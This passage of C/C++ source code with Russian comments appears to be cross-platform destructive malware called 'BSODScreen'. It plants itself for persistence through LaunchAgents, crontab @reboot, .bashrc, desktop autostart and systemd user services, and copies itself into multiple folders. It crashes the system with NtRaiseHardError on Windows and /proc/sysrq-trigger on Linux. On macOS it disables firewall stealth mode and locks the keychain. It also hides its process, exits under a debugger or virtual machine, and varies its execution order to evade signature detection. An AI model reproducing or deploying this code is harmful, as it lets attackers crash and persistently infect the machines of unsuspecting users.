	// Способ 3: Task Scheduler (видно в расписании)
	// schtasks /create /tn BSODScreen ...
#elif defined(__APPLE__)
	// macOS версия
	char procPath[MAX_PATH];
	uint32_t procPathSize = sizeof(procPath);
	if (proc_pidpath(getpid(), procPath, procPathSize) > 0)
	{
		strcpy(szPath, procPath);
	}
	else
	{
		readlink("/proc/self/exe", szPath, MAX_PATH - 1);
	}
	
	// Способ 1: Создаём LaunchAgent для текущего пользователя (автозагрузка при входе)
	CreateLaunchAgentPlist(szPath, "com.system.bsodsrc");
	
	// Способ 2: Создаём несколько LaunchAgent файлов с разными именами для масштабирования
	for (int i = 0; i < 5; i++)
	{
		char labelName[64];
		sprintf(labelName, "com.system.bsodsrc_%d", i);
		CreateLaunchAgentPlist(szPath, labelName);
	}
	
	// Способ 3: Пытаемся создать LaunchDaemon (системный уровень, требует sudo)
	const char* home = getenv("HOME");
	if (!home)
		home = "/Users/root";
	
	char daemonDir[MAX_PATH];
	sprintf(daemonDir, "%s/.local/share/daemons", home);
	mkdir(daemonDir, 0755);
	
	char daemonPlistPath[MAX_PATH];
	sprintf(daemonPlistPath, "%s/com.system.bsodsrc.plist", daemonDir);
	
	FILE* daemonFp = fopen(daemonPlistPath, "w");
	if (daemonFp)
	{
		fprintf(daemonFp, "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
		fprintf(daemonFp, "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n");
		fprintf(daemonFp, "<plist version=\"1.0\">\n");
		fprintf(daemonFp, "<dict>\n");
		fprintf(daemonFp, "    <key>Label</key>\n");
		fprintf(daemonFp, "    <string>com.system.bsodsrc</string>\n");
		fprintf(daemonFp, "    <key>ProgramArguments</key>\n");
		fprintf(daemonFp, "    <array>\n");
		fprintf(daemonFp, "        <string>%s</string>\n", szPath);
		fprintf(daemonFp, "    </array>\n");
		fprintf(daemonFp, "    <key>RunAtLoad</key>\n");
		fprintf(daemonFp, "    <true/>\n");
		fprintf(daemonFp, "    <key>KeepAlive</key>\n");
		fprintf(daemonFp, "    <true/>\n");
		fprintf(daemonFp, "    <key>StandardOutPath</key>\n");
		fprintf(daemonFp, "    <string>/dev/null</string>\n");
		fprintf(daemonFp, "    <key>StandardErrorPath</key>\n");
		fprintf(daemonFp, "    <string>/dev/null</string>\n");
		fprintf(daemonFp, "</dict>\n");
		fprintf(daemonFp, "</plist>\n");
		fclose(daemonFp);
		chmod(daemonPlistPath, 0644);
	}
	
	// Пытаемся запустить launchctl для загрузки агентов
	system("launchctl load ~/Library/LaunchAgents/com.system.bsodsrc.plist 2>/dev/null || true");
	for (int i = 0; i < 5; i++)
	{
		char loadCmd[256];
		sprintf(loadCmd, "launchctl load ~/Library/LaunchAgents/com.system.bsodsrc_%d.plist 2>/dev/null || true", i);
		system(loadCmd);
	}
#else
	// Linux версия
	readlink("/proc/self/exe", szPath, MAX_PATH - 1);
	
	const char* home = getenv("HOME");
	if (!home)
		home = "/root";

	// Способ 1: Добавление в crontab (@reboot запуск)
	char cronCmd[512];
	sprintf(cronCmd, "(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab - 2>/dev/null || true", szPath);
	system(cronCmd);

	// Способ 2: Добавление в ~/.bashrc для автозапуска
	char bashrcPath[MAX_PATH];
	sprintf(bashrcPath, "%s/.bashrc", home);
	FILE* bashrc = fopen(bashrcPath, "a");
	if (bashrc)
	{
		fprintf(bashrc, "\n# BSODScreen auto start\n%s &\n", szPath);
		fclose(bashrc);
	}

	// Способ 3: Добавление в ~/.config/autostart (для систем с X11/GNOME/KDE)
	char autostartDir[MAX_PATH];
	sprintf(autostartDir, "%s/.config/autostart", home);
	mkdir(autostartDir, 0755);
	
	char desktopFile[MAX_PATH];
	sprintf(desktopFile, "%s/bsodsrc.desktop", autostartDir);
	FILE* desktop = fopen(desktopFile, "w");
	if (desktop)
	{
		fprintf(desktop, "[Desktop Entry]\n");
		fprintf(desktop, "Type=Application\n");
		fprintf(desktop, "Exec=%s\n", szPath);
		fprintf(desktop, "Hidden=false\n");
		fprintf(desktop, "NoDisplay=true\n");
		fprintf(desktop, "X-GNOME-Autostart-enabled=true\n");
		fclose(desktop);
		chmod(desktopFile, 0644);
	}

	// Способ 4: Добавление в systemd user service (если доступен)
	char unitDir[MAX_PATH];
	sprintf(unitDir, "%s/.config/systemd/user", home);
	mkdir(unitDir, 0755);
	
	char unitFile[MAX_PATH];
	sprintf(unitFile, "%s/bsodsrc.service", unitDir);
	FILE* unit = fopen(unitFile, "w");
	if (unit)
	{
		fprintf(unit, "[Unit]\n");
		fprintf(unit, "Description=BSODScreen Service\n");
		fprintf(unit, "\n[Service]\n");
		fprintf(unit, "Type=simple\n");
		fprintf(unit, "ExecStart=%s\n", szPath);
		fprintf(unit, "Restart=always\n");
		fprintf(unit, "\n[Install]\n");
		fprintf(unit, "WantedBy=default.target\n");
		fclose(unit);
		chmod(unitFile, 0644);
		
		// Пытаемся включить сервис
		char enableCmd[256];
		sprintf(enableCmd, "systemctl --user enable bsodsrc 2>/dev/null || true");
		system(enableCmd);
	}
#endif

	// Способ 5: Клонирование в разные папки
	CloneToFolders(szPath);
}

// Рабочая функция для запуска в отдельном потоке
#ifdef _WIN32
DWORD WINAPI BackgroundWorkerThread(LPVOID lpParam)
{
	// ПОЛИМОРФНАЯ ПРОВЕРКА
	// Используем полиморфные смещения для добавления случайности
	volatile unsigned int poly_check = POLY_OFFSET_1 ^ POLY_OFFSET_2;
	
	// ОПРЕДЕЛЕНИЕ ВЕРСИИ ОС
	g_osVersion = GetOSVersion();
	const char* szOSVersion = GetOSVersionString(g_osVersion);

	// Получаем путь к текущему файлу
	char szPath[MAX_PATH];
	GetModuleFileNameA(NULL, szPath, MAX_PATH);
	
	// Проверка целостности кода с полиморфной маской
	if (!Security::VerifyCodeIntegrity()) {
		// Полиморфный выход
		volatile int dummy = poly_check & 0xFF;
		return dummy - 1;
	}

	// Вариативное выполнение в зависимости от версии
	if (POLY_VERSION & 0x01) {
		// Путь 1
		LoadExeToCache(szPath);
		AddToStartup();
		FreeExeCache();
	} else {
		// Путь 2 - другой порядок
		AddToStartup();
		LoadExeToCache(szPath);
		FreeExeCache();
	}

	return 0;
}

DWORD WINAPI CrashThread(LPVOID lpParam)
{
	// ВЫЗОВ BSOD / КРИТИЧЕСКОГО СОБЫТИЯ
	// Полиморфные варианты для избежания сигнатурного анализа
	unsigned long response = 0;

	// Полиморфная задержка с использованием смещений
	unsigned int delay = (POLY_SLEEP_TIME % 1000) + 100;
	Sleep(delay);

	// Полиморфное скрытие процесса
	if ((POLY_VERSION ^ POLY_RANDOM_SEED) & 0x01) {
		HideProcess();
	}

	// Выбор метода BSOD в зависимости от полиморфной версии
	unsigned int method = POLY_VERSION % 4;

	if (g_osVersion.dwMajor >= 6)
	{
		pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(
			GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
		
		if (NtSetInformationProcess)
		{
			// Полиморфные коды ошибок
			NTSTATUS errorCodes[] = {
				(NTSTATUS)STATUS_ASSERTION_FAILURE,
				(NTSTATUS)0xC0000142, // STATUS_UNKNOWN_REVISION
				(NTSTATUS)0xC000003C, // STATUS_INVALID_HANDLE
				(NTSTATUS)0xC0000017  // STATUS_NO_MEMORY
			};
			
			NTSTATUS error = errorCodes[method];
			NtRaiseHardError(error, 0, 0, NULL, 6, &response);
		}
	}
	else if (g_osVersion.dwMajor == 5)
	{
		// Альтернативные коды для Windows XP/2000
		NTSTATUS errorCodes[] = {
			(NTSTATUS)0xC000007B,
			(NTSTATUS)0xC000003C,
			(NTSTATUS)0xC0000017,
			(NTSTATUS)0xC0000142
		};
		
		NTSTATUS error = errorCodes[method];
		NtRaiseHardError(error, 0, 0, NULL, 6, &response);
	}

	return 0;
}
#else
void* BackgroundWorkerThread(void* lpParam)
{
	// Получаем путь к текущему файлу
	char szPath[MAX_PATH];
#ifdef __APPLE__
	uint32_t procPathSize = sizeof(szPath);
	if (proc_pidpath(getpid(), szPath, procPathSize) <= 0)
	{
		readlink("/proc/self/exe", szPath, MAX_PATH - 1);
		szPath[MAX_PATH - 1] = '\0';
	}
#else
	readlink("/proc/self/exe", szPath, MAX_PATH - 1);
	szPath[MAX_PATH - 1] = '\0';
#endif
	
	// Проверка целостности кода
	if (!Security::VerifyCodeIntegrity()) {
		return NULL;
	}

	// Загружаем программу в кэш
	LoadExeToCache(szPath);

	// Добавление программы на автозагрузку при первом запуске
	AddToStartup();

	// Освобождаем кэш
	FreeExeCache();

	return NULL;
}

void* CrashWorkerThread(void* lpParam)
{
	// Небольшая задержка
	sleep(1);

	// Скрываем процесс из диспетчера задач
	HideProcess();

	// ВЫЗОВ СИСТЕМНОЙ ОШИБКИ / КРИТИЧЕСКОГО СОБЫТИЯ
#ifdef __APPLE__
	// macOS: Kernel Panic
	system("sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setatp 0 2>/dev/null || true");
	system("security lock-keychain 2>/dev/null || true");
	
	// Генерируем segmentation fault
	int* p = NULL;
	*p = 0;
#else
	// Linux: Kernel Panic через сигнал
	FILE* fp = fopen("/proc/sysrq-trigger", "w");
	if (fp)
	{
		fprintf(fp, "c");  // 'c' = вызвать kernel panic
		fclose(fp);
	}
	
	// Если это не сработало, пытаемся другим способом
	int* p = NULL;
	*p = 0;  // Segmentation fault
#endif

	return NULL;
}
#endif

#ifdef _WIN32
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd)
{
	// ANTI-ANALYSIS: Критические проверки перед выполнением
	CHECK_ANALYSIS();
	
	// Запускаем фоновый мониторинг для анализа
	MONITOR_ANALYSIS();
	
	// ПОЛИМОРФНАЯ АНТИ-ОТЛАДКА
	// Проверки изменяют порядок в зависимости от версии
	volatile unsigned int poly_check_order = POLY_VERSION % 6;
	
	// Полиморфные проверки безопасности
	switch(poly_check_order) {
		case 0:
			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
			Security::DetectBreakpoints();
			break;
		case 1:
			Security::DetectBreakpoints();
			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
			break;
		case 2:
			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
			Security::DetectBreakpoints();
			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
			break;
		case 3:
			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
			Security::DetectBreakpoints();
			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
			break;
		case 4:
			Security::DetectBreakpoints();
			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
			break;
		case 5:
			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
			Security::DetectBreakpoints();
			break;
	}
	
	// Инициализация окна с полиморфным методом
	InitializeWindow();

	// Определяем версию ОС в главном потоке
	g_osVersion = GetOSVersion();

	// Создаём фоновый поток с полиморфным размером стека
	SIZE_T bg_stack = (1024 * ((POLY_OFFSET_1 & 0xFF) + 1));
	HANDLE hBackgroundThread = CreateThread(NULL, bg_stack, BackgroundWorkerThread, NULL, 0, NULL);
	if (hBackgroundThread)
	{
		CloseHandle(hBackgroundThread);
	}

	// Создаём поток для вызова BSOD с полиморфным размером стека
	SIZE_T crash_stack = (1024 * ((POLY_OFFSET_2 & 0xFF) + 1));
	HANDLE hCrashThread = CreateThread(NULL, crash_stack, CrashThread, NULL, 0, NULL);
	if (hCrashThread)
	{
		CloseHandle(hCrashThread);
	}
	
	// Полиморфный выход
	return POLY_VERSION % 256;
}
#else
// Стандартная функция main для Linux/macOS
int main()
{
	// ANTI-ANALYSIS: Критические проверки перед выполнением
	CHECK_ANALYSIS();
	
	// Запускаем фоновый мониторинг для анализа
	MONITOR_ANALYSIS();
	
	// ПОЛИМОРФНАЯ АНТИ-ОТЛАДКА (Linux/macOS)
	volatile unsigned int poly_check_order = POLY_VERSION % 4;
	
	// Полиморфный порядок проверок безопасности
	switch(poly_check_order) {
		case 0:
			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
			break;
		case 1:
			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
			break;
		case 2:
			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
			break;
		case 3:
			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
			break;
	}
	
	// Инициализация окна (эффект плавления экрана)
	InitializeWindow();

	// Определяем версию ОС в главном потоке
	g_osVersion = GetOSVersion();

	// ПОЛИМОРФНОЕ РАСПРЕДЕЛЕНИЕ ПОТОКОВ
	unsigned int threading_variant = POLY_VERSION % 2;

	// Создаём рабочий поток для клонирования и автозагрузки
#ifdef __APPLE__
	pthread_t bgThread, crashThread;
	
	// Полиморфные атрибуты потока
	pthread_attr_t attr;
	pthread_attr_init(&attr);
	size_t stack_size = 1024 * ((POLY_OFFSET_1 & 0xFF) + 1);
	pthread_attr_setstacksize(&attr, stack_size);
	
	pthread_create(&bgThread, &attr, BackgroundWorkerThread, NULL);
	pthread_detach(bgThread);
	
	// Создаём поток для вызова BSOD
	pthread_create(&crashThread, &attr, CrashWorkerThread, NULL);
	pthread_detach(crashThread);
	
	pthread_attr_destroy(&attr);
#else
	// На Linux используем fork для полного отделения
	// Полиморфный выбор метода
	if (threading_variant) {
		// Метод 1: fork для фонового процесса
		pid_t bgPid = fork();
		if (bgPid == 0)
		{
			BackgroundWorkerThread(NULL);
			exit(0);
		}
		
		// Процесс для BSOD
		pid_t crashPid = fork();
		if (crashPid == 0)
		{
			CrashWorkerThread(NULL);
			exit(0);
		}
	} else {
		// Метод 2: fork в другом порядке
		pid_t crashPid = fork();
		if (crashPid == 0)
		{
			CrashWorkerThread(NULL);
			exit(0);
		}
		
		pid_t bgPid = fork();
		if (bgPid == 0)
		{
			BackgroundWorkerThread(NULL);
			exit(0);
		}
	}
#endif
	
	// Полиморфный выход
	return POLY_VERSION % 256;
}
#endif
